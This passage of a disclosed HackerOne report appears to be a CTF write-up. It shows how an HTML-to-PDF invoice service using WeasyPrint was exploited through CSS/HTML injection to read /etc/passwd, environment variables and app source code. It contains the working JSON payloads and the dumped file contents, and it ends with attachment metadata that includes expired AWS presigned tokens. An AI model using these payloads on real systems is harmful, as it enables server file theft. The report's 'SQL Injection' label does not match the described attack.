integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n                \u003cscript src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n        \u003c/body\u003e\n\u003c/html\u003e\n```\n\nWe can see that /invoices/preview returns HTML. We can try the same on /invoices/pdfize with\n\n```\ncurl 172.23.0.2/invoices/pdfize?d=%7B%22companyName%22%3A%22something%22%2C%22email%22%3A%22something%22%2C%22invoiceNumber%22%3A%22something%22%2C%22date%22%3A%22something%22%2C%22items%22%3A%5B%5D%2C%22styles%22%3A%7B%22body%22%3A%7B%22background-color%22%3A%22white%22%7D%7D%7D\n```\n\nThe result is the following pdf file:\n\n![](img6.jpg)\n\nThis pdf seems to match the HTML, so we can thus surmise that the data we provide is inserted into an HTML template and then converted to a PDF. Now we ask ourselves, how do we attack this?\n\nThe idea I had was to have the HTML to PDF parser fetch a file for us, since we can include attachments in HTML. To do this, first we have to figure out what HTML to PDF parser the backend is using. Taking a look at the payload we provide, we can see that part of the json data is CSS data. If we set the background-image CSS field to point to our server, then the PDF parser must send a request to our server. To test this, I used the following payload:\n\n```\n{\"companyName\":\"something\",\"email\":\"something\",\"invoiceNumber\":\"something\",\"date\":\"something\",\"items\":[],\"styles\":{\"body\":{\"background-color\":\"white\", \"background-image\", \"url('REDACTED/test.jpg\"}}}\n```\n\nSure enough, the PDF parser made a request:\n\n```\n\"GET /test.jpg HTTP/1.1\" 200 415 \"-\" \"WeasyPrint 44 (http://weasyprint.org/)\"\n```\n\nNow we know the parser that is used. We can now look online for how to include attachments using WeasyPrint, leading me to [this](https://github.com/Kozea/WeasyPrint/issues/558) link. This tells us that we can include a file in the PDF using:\n\n```\n\u003clink rel=attachment href=\"path-to-some-file\" /\u003e\n```\n\nNow we have to maniuplate the HTML using the JSON data we provide so that we include the attachment link. To do this, I tested adding `\u003clink\u003e` to every field in the JSON data until I found one that is not properly escaped. It turned out to be in the CSS field. To end the CSS styling, we must include `\u003c/style\u003e`, but this did not work at first. To work around this, I found that the template parser interprets `\u003c\u003c/style\u003e/\u003e` into `\u003c/style\u003e`, thus allowing us to escape the CSS and inject our own HTML. Now, we just have to include the link to the attachment. My JSON payload is as follows:\n\n```\n{\"companyName\":\"test\",\"email\":\"test\",\"invoiceNumber\":\"test\",\"date\":\"test\",\"items\":[],\"styles\":{\"body\":{\"background\u003c\u003c/style\u003e/style\u003e\u003clink rel='attachment' href='file:///etc/passwd'\u003e\u003cstyle\u003e\":\"white\"}}}\n```\n\nSure enough, when we send this as the payload and download the PDF, we obtain `/etc/passwd` as shown below:\n\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n```\n\nWe have an arbitrary local file download, and now we just have to search for any interesting files. I first looked in `/proc/self/environ` to view the environment variables:\n\n```\nNGINX_WORKER_PROCESSES=1UWSGI_CHEAPER=2NGINX_MAX_UPLOAD=0SUPERVISOR_GROUP_NAME=uwsgiPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/rootUWSGI_PROCESSES=16LANG=C.UTF-8SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockPYTHON_VERSION=3.7.2SHLVL=0PYTHON_PIP_VERSION=19.0.1SUPERVISOR_ENABLED=1NJS_VERSION=1.15.8.0.2.7-1~stretchUWSGI_INI=/app/uwsgi.iniNGINX_VERSION=1.15.8-1~stretchSTATIC_PATH=/app/staticGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPYTHONPATH=/appSTATIC_URL=/staticSUPERVISOR_PROCESS_NAME=uwsgiFLAG=nice tryLISTEN_PORT=80HOSTNAME=990292ee4001PWD=/appSTATIC_INDEX=0a\n```\n\n`PYTHONPATH=/app` looks very interesting. Because WeasyPrint uses python, I guessed that the source code of the app is in /app/main.py. Using our local file download attack and providing /app/main.py allows us to obtain the source code, and to my surprise, this was the end of the CTF challenge:\n\n```\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n```\n\n## Impact\n\nSee writeup. Note: ![](img*.jpg) should be attached.","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":437992,"file_name":"img2.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/992/d9254fe25601180768788d5589ddfb141ded3926/img2.jpg?response-content-disposition=attachment%3B%20filename%3D%22img2.jpg%22%3B%20filename%2A%3DUTF-8%27%27img2.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c2f0563387d5ad38fbb834750b2fe445de10a14892fb2258df7162292813e0da","file_size":132753,"type":"image/jpeg"},{"id":437993,"file_name":"img1.JPG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/993/bbc808de703989db39418ca6f974103c85580006/img1.JPG?response-content-disposition=attachment%3B%20filename%3D%22img1.JPG%22%3B%20filename%2A%3DUTF-8%27%27img1.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6f63279a10a8a882f2ed040b5a57918f9bf6be2465a878abee1b52c0f8988fb7","file_size":229959,"type":"image/jpeg"},{"id":437994,"file_name":"img3.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/994/0c0db99a93b1e176a779640c17939b1120660e78/img3.jpg?response-content-disposition=attachment%3B%20filename%3D%22img3.jpg%22%3B%20filename%2A%3DUTF-8%27%27img3.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=816fcd647ef7d9db635f0cca26b6c1160ccfde273d955d90564e711ca98f36c4","file_size":34210,"type":"image/jpeg"},{"id":437995,"file_name":"img4.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/995/860b789465d702536ada734eed418a005ae6ba9f/img4.jpg?response-content-disposition=attachment%3B%20filename%3D%22img4.jpg%22%3B%20filename%2A%3DUTF-8%27%27img4.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f3d5654a4726b67aa9a23b6cb53b9aaf9097e0c36736ab6feabe6bed8b27b166","file_size":120804,"type":"image/jpeg"},{"id":437996,"file_name":"img5.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/996/533b1a787ba78521b44e0c636fb3b16d83ff180d/img5.jpg?response-content-disposition=attachment%3B%20filename%3D%22img5.jpg%22%3B%20filename%2A%3DUTF-8%27%27img5.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2e3c21eb5f747f63c127efee3d3a661d5a0d702314af97a9523442e62f690e2b","file_size":34240,"type":"image/jpeg"},{"id":437997,"file_name":"img6.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/997/bf294a36b4eb2d8752a0bbca7a8658803e49a507/img6.jpg?response-content-disposition=attachment%3B%20filename%3D%22img6.jpg%22%3B%20filename%2A%3DUTF-8%27%27img6.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150740Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b9e777fa64661b011b44a177760677bbad2b7db57d87bc0e561bf91273b8335d","file_size":37788,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2019-05-08T15:54:47.505Z","allow_singular_disclosure_after":-76633973.41480635,"singular_disclosure_allowed":true,"vote_count":5,"voters":["checkm50","sourc7","ali","tosun","globalenigma"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4301781,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates on this?","automated_response":false,"created_at":"2019-03-11T17:12:34.283Z","updated_at":"2019-03-11T17:12:34.283Z","actor":{"username":"voidmercy","cleared":false,"url":"/voidmercy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/254/760/23b2eee9e5de8d3d71119050fec0fdbaafd50b2b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492851,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","automated_response":false,"created_at":"2019-04-05T18:34:46.134Z","updated_at":"2019-04-05T18:34:46.134Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"voidmercy","url":"/voidmercy"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509081,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-08T15:54:47.439Z","updated_at":"2019-04-08T15:54:47.439Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509084,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","automated_response":false,"created_at":"2019-04-08T15:54:55.938Z","updated_at":"2019-04-08T15:54:55.938Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}